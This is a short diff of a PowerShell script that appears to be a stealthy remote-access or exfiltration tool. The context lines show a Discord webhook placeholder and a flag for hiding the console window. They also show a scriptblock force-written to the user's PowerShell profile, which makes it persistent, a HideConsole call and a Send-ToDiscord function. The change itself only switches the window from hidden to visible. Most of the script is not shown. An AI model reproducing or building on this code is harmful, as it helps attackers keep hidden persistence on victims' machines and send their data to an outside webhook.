@@ -18,7 +18,7 @@ if ($dc.Length -eq 0){
 $dc = "YOUR_WEBHOOK_HERE"
 }
 
-$hideWindow = 1 # 1 = Hidden
+$hideWindow = 0 # 1 = Hidden
 
 [Console]::BackgroundColor = "Black"
 [Console]::SetWindowSize(60, 20)
@@ -138,7 +138,6 @@ catch [System.Management.Automation.PSNotSupportedException]
 "@
 
 $scriptblock | Out-File -FilePath $Profile -Force
-
 HideConsole
 
 function Send-ToDiscord {
